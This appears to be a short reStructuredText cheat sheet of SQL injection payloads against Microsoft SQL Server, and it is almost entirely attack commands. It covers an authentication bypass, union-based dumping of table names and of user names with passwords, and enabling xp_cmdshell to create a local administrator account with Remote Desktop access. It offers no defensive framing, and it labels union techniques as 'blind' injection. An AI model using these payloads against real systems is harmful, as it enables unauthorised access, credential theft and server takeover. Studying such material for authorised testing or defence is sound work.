Blind MSSQL Injection page
*****************************

Login Page
##############

For login page try the following to login

.. code-block:: console

   admin' or 1=1 --

Test Injection
##################

First make sure it is injectable by a wait command

.. code-block:: console

        ' waitfor delay '00:00:10'-- 

The goal of this is to find where the null's error out. If it errors out do the last NULL. So In this case, the third NULL errored out and we are left with two NULLs that aren't errored.

.. code-block:: console

   ' order by 2 --
   ' union select null,null --

**Note, the rest of the commands are assuming the NULL is two.**
   
Find DB name
##############

.. code-block:: console

        ' union all select db_name(), 2 --

List tables
#############

Assume that this output shows the tables `albums, singles, concerts, users, songs`.

.. code-block:: console

   ' union all select table_name, 2 from information_schema.tables --

Display table column 1
########################

.. code-block:: console

   ' union all select column_name, 2 from information_schema.columns where table_name='users' order by 1 --

Display Username and Password
################################

.. code-block:: console

   ' union all select name+' '+pass, 2 from users--

Using xp_cmdshell to run commands ... create a user
########################################################

.. code-block:: console

   ' EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;--
   ' EXEC xp_cmdshell 'net user <userame> <password> /add';--
   ' EXEC xp_cmdshell 'net localgroup Administrators <username> /add';--
   ' EXEC xp_cmdshell 'net localgroup "Remote Desktop Users" <username> /add';--


